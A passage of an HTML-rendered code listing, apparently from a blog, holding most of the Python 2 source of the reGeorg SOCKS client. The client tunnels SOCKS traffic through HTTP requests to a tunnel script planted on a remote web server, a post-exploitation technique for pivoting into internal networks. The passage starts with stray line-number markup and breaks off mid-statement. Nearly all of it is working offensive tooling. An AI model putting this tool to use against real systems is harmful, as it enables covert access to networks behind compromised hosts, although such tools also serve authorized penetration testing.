class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">import argparse</span><br><span class="line">import urllib3</span><br><span class="line">from threading import Thread</span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from socket import *</span><br><span class="line">from threading import Thread</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># Constants</span><br><span class="line">SOCKTIMEOUT = 5</span><br><span class="line">RESENDTIMEOUT = 300</span><br><span class="line">VER = &quot;\x05&quot;</span><br><span class="line">METHOD = &quot;\x00&quot;</span><br><span class="line">SUCCESS = &quot;\x00&quot;</span><br><span class="line">SOCKFAIL = &quot;\x01&quot;</span><br><span class="line">NETWORKFAIL = &quot;\x02&quot;</span><br><span class="line">HOSTFAIL = &quot;\x04&quot;</span><br><span class="line">REFUSED = &quot;\x05&quot;</span><br><span class="line">TTLEXPIRED = &quot;\x06&quot;</span><br><span class="line">UNSUPPORTCMD = &quot;\x07&quot;</span><br><span class="line">ADDRTYPEUNSPPORT = &quot;\x08&quot;</span><br><span class="line">UNASSIGNED = &quot;\x09&quot;</span><br><span class="line"></span><br><span class="line">BASICCHECKSTRING = &quot;Georg says, &#x27;All seems fine&#x27;&quot;</span><br><span class="line"></span><br><span class="line"># Globals</span><br><span class="line">READBUFSIZE = 1024</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">RESET_SEQ = &quot;\033[0m&quot;</span><br><span class="line">COLOR_SEQ = &quot;\033[1;%dm&quot;</span><br><span class="line">BOLD_SEQ = &quot;\033[1m&quot;</span><br><span class="line"></span><br><span class="line">BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)</span><br><span class="line"></span><br><span class="line">LEVEL = &#123;&quot;INFO&quot;: logging.INFO, &quot;DEBUG&quot;: logging.DEBUG, &#125;</span><br><span class="line"></span><br><span class="line">logLevel = &quot;INFO&quot;</span><br><span class="line"></span><br><span class="line">COLORS = &#123;</span><br><span class="line">    &#x27;WARNING&#x27;: YELLOW,</span><br><span class="line">    &#x27;INFO&#x27;: WHITE,</span><br><span class="line">    &#x27;DEBUG&#x27;: BLUE,</span><br><span class="line">    &#x27;CRITICAL&#x27;: YELLOW,</span><br><span class="line">    &#x27;ERROR&#x27;: RED,</span><br><span class="line">    &#x27;RED&#x27;: RED,</span><br><span class="line">    &#x27;GREEN&#x27;: GREEN,</span><br><span class="line">    &#x27;YELLOW&#x27;: YELLOW,</span><br><span class="line">    &#x27;BLUE&#x27;: BLUE,</span><br><span class="line">    &#x27;MAGENTA&#x27;: MAGENTA,</span><br><span class="line">    &#x27;CYAN&#x27;: CYAN,</span><br><span class="line">    &#x27;WHITE&#x27;: WHITE,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def formatter_message(message, use_color=True):</span><br><span class="line">    if use_color:</span><br><span class="line">        message = message.replace(&quot;$RESET&quot;, RESET_SEQ).replace(&quot;$BOLD&quot;, BOLD_SEQ)</span><br><span class="line">    else:</span><br><span class="line">        message = message.replace(&quot;$RESET&quot;, &quot;&quot;).replace(&quot;$BOLD&quot;, &quot;&quot;)</span><br><span class="line">    return message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ColoredFormatter(logging.Formatter):</span><br><span class="line">    def __init__(self, msg, use_color=True):</span><br><span class="line">        logging.Formatter.__init__(self, msg)</span><br><span class="line">        self.use_color = use_color</span><br><span class="line"></span><br><span class="line">    def format(self, record):</span><br><span class="line">        levelname = record.levelname</span><br><span class="line">        if self.use_color and levelname in COLORS:</span><br><span class="line">            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ</span><br><span class="line">            record.levelname = levelname_color</span><br><span class="line">        return logging.Formatter.format(self, record)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ColoredLogger(logging.Logger):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        FORMAT = &quot;[$BOLD%(levelname)-18s$RESET]  %(message)s&quot;</span><br><span class="line">        COLOR_FORMAT = formatter_message(FORMAT, True)</span><br><span class="line">        logging.Logger.__init__(self, name, logLevel)</span><br><span class="line">        if (name == &quot;transfer&quot;):</span><br><span class="line">            COLOR_FORMAT = &quot;\x1b[80D\x1b[1A\x1b[K%s&quot; % COLOR_FORMAT</span><br><span class="line">        color_formatter = ColoredFormatter(COLOR_FORMAT)</span><br><span class="line"></span><br><span class="line">        console = logging.StreamHandler()</span><br><span class="line">        console.setFormatter(color_formatter)</span><br><span class="line"></span><br><span class="line">        self.addHandler(console)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.setLoggerClass(ColoredLogger)</span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line">transferLog = logging.getLogger(&quot;transfer&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SocksCmdNotImplemented(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SocksProtocolNotImplemented(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RemoteConnectionFailed(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class session(Thread):</span><br><span class="line">    def __init__(self, pSocket, connectString):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.pSocket = pSocket</span><br><span class="line">        self.connectString = connectString</span><br><span class="line">        o = urlparse(connectString)</span><br><span class="line">        try:</span><br><span class="line">            self.httpPort = o.port</span><br><span class="line">        except:</span><br><span class="line">            if o.scheme == &quot;https&quot;:</span><br><span class="line">                self.httpPort = 443</span><br><span class="line">            else:</span><br><span class="line">                self.httpPort = 80</span><br><span class="line">        self.httpScheme = o.scheme</span><br><span class="line">        self.httpHost = o.netloc.split(&quot;:&quot;)[0]</span><br><span class="line">        self.httpPath = o.path</span><br><span class="line">        self.cookie = None</span><br><span class="line">        if o.scheme == &quot;http&quot;:</span><br><span class="line">            self.httpScheme = urllib3.HTTPConnectionPool</span><br><span class="line">        else:</span><br><span class="line">            self.httpScheme = urllib3.HTTPSConnectionPool</span><br><span class="line"></span><br><span class="line">    def parseSocks5(self, sock):</span><br><span class="line">        log.debug(&quot;SocksVersion5 detected&quot;)</span><br><span class="line">        nmethods, methods = (sock.recv(1), sock.recv(1))</span><br><span class="line">        sock.sendall(VER + METHOD)</span><br><span class="line">        ver = sock.recv(1)</span><br><span class="line">        if ver == &quot;\x02&quot;:  # this is a hack for proxychains</span><br><span class="line">            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))</span><br><span class="line">        else:</span><br><span class="line">            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))</span><br><span class="line">        target = None</span><br><span class="line">        targetPort = None</span><br><span class="line">        if atyp == &quot;\x01&quot;:  # IPv4</span><br><span class="line">            # Reading 6 bytes for the IP and Port</span><br><span class="line">            target = sock.recv(4)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            target = &quot;.&quot; .join([str(ord(i)) for i in target])</span><br><span class="line">        elif atyp == &quot;\x03&quot;:  # Hostname</span><br><span class="line">            targetLen = ord(sock.recv(1))  # hostname length (1 byte)</span><br><span class="line">            target = sock.recv(targetLen)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            target = &quot;&quot;.join([unichr(ord(i)) for i in target])</span><br><span class="line">        elif atyp == &quot;\x04&quot;:  # IPv6</span><br><span class="line">            target = sock.recv(16)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            tmp_addr = []</span><br><span class="line">            for i in xrange(len(target) / 2):</span><br><span class="line">                tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))</span><br><span class="line">            target = &quot;:&quot;.join(tmp_addr)</span><br><span class="line">        targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])</span><br><span class="line">        if cmd == &quot;\x02&quot;:  # BIND</span><br><span class="line">            raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)</span><br><span class="line">        elif cmd == &quot;\x03&quot;:  # UDP</span><br><span class="line">            raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)</span><br><span class="line">        elif cmd == &quot;\x01&quot;:  # CONNECT</span><br><span class="line">            serverIp = target</span><br><span class="line">            try:</span><br><span class="line">                serverIp = gethostbyname(target)</span><br><span class="line">            except:</span><br><span class="line">                log.error(&quot;oeps&quot;)</span><br><span class="line">            serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])</span><br><span class="line">            self.cookie = self.setupRemoteSession(target, targetPort)</span><br><span class="line">            if self.cookie:</span><br><span class="line">                sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                sock.sendall(VER + REFUSED + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                raise RemoteConnectionFailed(&quot;[%s:%d] Remote failed&quot; % (target, targetPort))</span><br><span class="line"></span><br><span class="line">        raise SocksCmdNotImplemented(&quot;Socks5 - Unknown CMD&quot;)</span><br><span class="line"></span><br><span class="line">    def parseSocks4(self, sock):</span><br><span class="line">        log.debug(&quot;SocksVersion4 detected&quot;)</span><br><span class="line">        cmd = sock.recv(1)</span><br><span class="line">        if cmd == &quot;\x01&quot;:  # Connect</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])</span><br><span class="line">            target = sock.recv(4)</span><br><span class="line">            sock.recv(1)</span><br><span class="line">            target = &quot;.&quot;.join([str(ord(i)) for i in target])</span><br><span class="line">            serverIp = target</span><br><span class="line">            try:</span><br><span class="line">                serverIp = gethostbyname(target)</span><br><span class="line">            except:</span><br><span class="line">                log.error(&quot;oeps&quot;)</span><br><span class="line">            serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])</span><br><span class="line">            self.cookie = self.setupRemoteSession(target, targetPort)</span><br><span class="line">            if self.cookie:</span><br><span class="line">                sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                sock.sendall(&quot;\x00&quot; + &quot;\x91&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                raise RemoteConnectionFailed(&quot;Remote connection failed&quot;)</span><br><span class="line">        else:</span><br><span class="line">            raise SocksProtocolNotImplemented(&quot;Socks4 - Command [%d] Not implemented&quot; % ord(cmd))</span><br><span class="line"></span><br><span class="line">    def handleSocks(self, sock):</span><br><span class="line">        # This is where we setup the socks connection</span><br><span class="line">        ver = sock.recv(1)</span><br><span class="line">        if ver == &quot;\x05&quot;:</span><br><span class="line">            return self.parseSocks5(sock)</span><br><span class="line">        elif ver == &quot;\x04&quot;:</span><br><span class="line">            return self.parseSocks4(sock)</span><br><span class="line"></span><br><span class="line">    def setupRemoteSession(self, target, port):</span><br><span class="line">        headers = &#123;&quot;X-CMD&quot;: &quot;CONNECT&quot;, &quot;X-TARGET&quot;: target, &quot;X-PORT&quot;: port&#125;</span><br><span class="line">        self.target = target</span><br><span class="line">        self.port = port</span><br><span class="line">        cookie = None</span><br><span class="line">        conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">        # response = conn.request(&quot;POST&quot;, self.httpPath, params, headers)</span><br><span class="line">        response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=connect&amp;target=%s&amp;port=%d&quot; % (target, port), headers=headers, body=&quot;&quot;)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">            if status == &quot;OK&quot;:</span><br><span class="line">                cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                log.info(&quot;[%s:%d] HTTP [200]: cookie [%s]&quot; % (self.target, self.port, cookie))</span><br><span class="line">            else:</span><br><span class="line">                if response.getheader(&quot;X-ERROR&quot;) is not None:</span><br><span class="line">                    log.error(response.getheader(&quot;X-ERROR&quot;))</span><br><span class="line">        else:</span><br><span class="line">            log.error(&quot;[%s:%d] HTTP [%d]: [%s]&quot; % (self.target, self.port, response.status, response.getheader(&quot;X-ERROR&quot;)))</span><br><span class="line">            log.error(&quot;[%s:%d] RemoteError: %s&quot; % (self.target, self.port, response.data))</span><br><span class="line">        conn.close()</span><br><span class="line">        return cookie</span><br><span class="line"></span><br><span class="line">    def closeRemoteSession(self):</span><br><span class="line">        headers = &#123;&quot;X-CMD&quot;: &quot;DISCONNECT&quot;, &quot;Cookie&quot;: self.cookie&#125;</span><br><span class="line">        params = &quot;&quot;</span><br><span class="line">        conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">        response = conn.request(&quot;POST&quot;, self.httpPath + &quot;?cmd=disconnect&quot;, params, headers)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            log.info(&quot;[%s:%d] Connection Terminated&quot; % (self.target, self.port))</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    def reader(self):</span><br><span class="line">        conn = urllib3.PoolManager()</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                if not self.pSocket:</span><br><span class="line">                    break</span><br><span class="line">                data = &quot;&quot;</span><br><span class="line">                headers = &#123;&quot;X-CMD&quot;: &quot;READ&quot;, &quot;Cookie&quot;: self.cookie, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125;</span><br><span class="line">                response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=read&quot;, headers=headers, body=&quot;&quot;)</span><br><span class="line">                data = None</span><br><span class="line">                if response.status == 200:</span><br><span class="line">                    status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">                    if status == &quot;OK&quot;:</span><br><span class="line">                        if response.getheader(&quot;set-cookie&quot;) is not None:</span><br><span class="line">                            cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                        data = response.data</span><br><span class="line">                        # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x bugs that have been reported, will find a propper fix laters</span><br><span class="line">                        try:</span><br><span class="line">                            if response.getheader(&quot;server&quot;).find(&quot;Apache-Coyote/1.1&quot;) &gt; 0:</span><br><span class="line">                                data = data[:len(data) - 1]</span><br><span class="line">                        except:</span><br><span class="line">                            pass</span><br><span class="line">                        if data is None:</span><br><span class="line">                            data = &quot;&quot;</span><br><span class="line">                    else:</span><br><span class="line">                        data = None</span><br><span class="line">                        log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;X-ERROR&quot;)))</span><br><span class="line">                else:</span><br><span class="line">                    log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status))</span><br><span class="line">                if data is None:</span><br><span class="line">                    # Remote socket closed</span><br><span class="line">                    break</span><br><span class="line">                if len(data) == 0:</span><br><span class="line">                    sleep(0.1)</span><br><span class="line">                    continue</span><br><span class="line">                transferLog.info(&quot;[%s:%d] &lt;&lt;&lt;&lt; [%d]&quot; % (self.target, self.port, len(data)))</span><br><span class="line">                self.pSocket.send(data)</span><br><span class="line">            except Exception, ex:</span><br><span class="line">                raise ex</span><br><span class="line">        self.closeRemoteSession()</span><br><span class="line">        log.debug(&quot;[%s:%d] Closing localsocket&quot; % (self.target, self.port))</span><br><span class="line">        try:</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except:</span><br><span class="line">            log.debug(&quot;[%s:%d] Localsocket already closed&quot; % (self.target, self.port))</span><br><span class="line"></span><br><span class="line">    def writer(self):</span><br><span class="line">        global READBUFSIZE</span><br><span class="line">        conn = urllib3.PoolManager()</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                self.pSocket.settimeout(1)</span><br><span class="line">                data = self.pSocket.recv(READBUFSIZE)</span><br><span class="line">                if not data:</span><br><span class="line">                    break</span><br><span class="line">                headers = &#123;&quot;X-CMD&quot;: &quot;FORWARD&quot;, &quot;Cookie&quot;: self.cookie, &quot;Content-Type&quot;: &quot;application/octet-stream&quot;, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125;</span><br><span class="line">                response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=forward&quot;, headers=headers, body=data)</span><br><span class="line">                if response.status == 200:</span><br><span class="line">                    status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">                    if status == &quot;OK&quot;:</span><br><span class="line">                        if response.getheader(&quot;set-cookie&quot;) is not None:</span><br><span class="line">                            self.cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                    else:</span><br><span class="line">                        log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;x-error&quot;)))</span><br><span class="line">                        break</span><br><span class="line">                else:</span><br><span class="line">                    log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status))</span><br><span class="line">                    break</span><br><span class="line">                transferLog.info(&quot;[%s:%d] &gt;&gt;&gt;&gt; [%d]&quot; % (self.target, self.port, len(data)))</span><br><span class="line">            except timeout:</span><br><span class="line">                continue</span><br><span class="line">            except Exception, ex:</span><br><span class="line">                raise ex</span><br><span class="line">                break</span><br><span class="line">        self.closeRemoteSession()</span><br><span class="line">        log.debug(&quot;Closing localsocket&quot;)</span><br><span class="line">        try:</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except:</span><br><span class="line">            log.debug(&quot;Localsocket already closed&quot;)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.handleSocks(self.pSocket):</span><br><span class="line">                log.debug(&quot;Staring reader&quot;)</span><br><span class="line">                r = Thread(target=self.reader, args=())</span><br><span class="line">                r.start()</span><br><span class="line">                log.debug(&quot;Staring writer&quot;)</span><br><span class="line">                w = Thread(target=self.writer, args=())</span><br><span class="line">                w.start()</span><br><span class="line">                r.join()</span><br><span class="line">                w.join()</span><br><span class="line">        except SocksCmdNotImplemented, si:</span><br><span class="line">            log.error(si.message)</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except SocksProtocolNotImplemented, spi:</span><br><span class="line">            log.error(spi.message)</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except Exception, e:</span><br><span class="line">            log.error(e.message)</span><br><span class="line">            self.closeRemoteSession()</span><br><span class="line">            self.pSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def askGeorg(connectString):</span><br><span class="line">    connectString = connectString</span><br><span class="line">    o = urlparse(connectString)</span><br><span class="line">    try:</span><br><span class="line">        httpPort = o.port</span><br><span class="line">    except:</span><br><span class="line">        if o.scheme == &quot;https&quot;:</span><br><span class="line">            httpPort = 443</span><br><span class="line">        else:</span><br><span class="line">            httpPort = 80</span><br><span class="line">    httpScheme = o.scheme</span><br><span class="line">    httpHost = o.netloc.split(&quot;:&quot;)[0]</span><br><span class="line">    httpPath = o.path</span><br><span class="line">    if o.scheme == &quot;http&quot;:</span><br><span class="line">        httpScheme = urllib3.HTTPConnectionPool</span><br><span class="line">    else:</span><br><span class="line">        httpScheme = urllib3.HTTPSConnectionPool</span><br><span class="line"></span><br><span class="line">    conn = httpScheme(host=httpHost, port=httpPort)</span><br><span class="line">    response = conn.request(&quot;GET&quot;, httpPath)</span><br><span class="line">    if response.status == 200:</span><br><span class="line">        if BASICCHECKSTRING == response.data.strip():</span><br><span class="line">            log.info(BASICCHECKSTRING)</span><br><span class="line">            return True</span><br><span class="line">    conn.close()</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print &quot;&quot;&quot;\033[1m</span><br><span class="line">    \033[1;33m</span><br><span class="line">                     _____</span><br><span class="line">  _____   ______  __|___  |__  ______  _____  _____   ______</span><br><span class="line"> |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|</span><br><span class="line"> |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |</span><br><span class="line"> |__|\__\|______||______|  __||______|\_____/|__|\__\|______|</span><br><span class="line">                    |_____|</span><br><span class="line">                    ... every office needs a tool like Georg</span><br><span class="line"></span><br><span class="line">  willem@sensepost.com / @_w_m__</span><br><span class="line">  sam@sensepost.com / @trowalts</span><br><span class="line">  etienne@sensepost.com / @kamp_staaldraad</span><br><span class="line">  \033[0m</span><br><span class="line">   &quot;&quot;&quot;</span><br><span class="line">    log.setLevel(logging.DEBUG)</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;Socks server for reGeorg HTTP(s) tunneller&#x27;)</span><br><span class="line">    parser.add_argument(&quot;-l&quot;, &quot;--listen-on&quot;, metavar=&quot;&quot;, help=&quot;The default listening address&quot;, default=&quot;127.0.0.1&quot;)</span><br><span class="line">    parser.add_argument(&quot;-p&quot;, &quot;--listen-port&quot;, metavar=&quot;&quot;, help=&quot;The default listening port&quot;, type=int, default=&quot;8888&quot;)</span><br><span class="line">    parser.add_argument(&quot;-r&quot;, &quot;--read-buff&quot;, metavar=&quot;&quot;, help=&quot;Local read buffer, max data to be sent per POST&quot;, type=int, default=&quot;1024&quot;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, metavar=&quot;&quot;, required=True, help=&quot;The url containing the tunnel script&quot;)</span><br><span class="line">    parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, metavar=&quot;&quot;, help=&quot;Verbose output[INFO|DEBUG]&quot;, default=&quot;INFO&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if (args.verbose in LEVEL):</span><br><span class="line">        log.setLevel(LEVEL[args.verbose])</span><br><span class="line">        log.info(&quot;Log Level set to [%s]&quot; % args.verbose)</span><br><span class="line"></span><br><span class="line">    log.info(&quot;Starting socks server [%s:%d], tunnel at [%s]&quot; % (args.listen_on, args.listen_port, args.url))</span><br><span class="line">    log.info(&quot;Checking if Georg is ready&quot;)</span><br><span class="line">    if not askGeorg(args.url):</span><br><span class="line">        log.info(&quot;Georg is not ready, please check url&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    READBUFSIZE = args.read_buff</span><br><span class="line">    servSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)</span><br><span class="line">    servSock.bind((args.listen_on, args.listen_port))</span><br><span class="line">    servSock.listen(1000)</span><br><span class="line">    while 